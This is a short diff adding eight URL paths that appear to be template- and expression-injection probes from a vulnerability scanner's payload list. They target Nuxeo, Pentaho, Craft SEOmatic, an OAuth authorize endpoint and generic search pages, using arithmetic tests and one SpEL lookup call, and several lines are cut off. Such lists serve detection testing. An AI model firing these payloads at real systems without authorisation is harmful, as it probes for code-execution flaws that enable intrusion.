@@ -1,0 +1,8 @@
+/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test
+/nuxeo/login.jsp/pwn${31333333330+7}.xhtml
+/pentaho/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23{T(java.net.InetAddress).getByName(
+/actions/seomatic/meta-container/meta-link-container/?uri={{228*
+/actions/seomatic/meta-container/all-meta-containers?uri={{228*
+/page?name={{range.constructor(\
+/search?search_key={{1337*1338}}
+/search?search_key=%7B%7B1337*1338%7D%7D
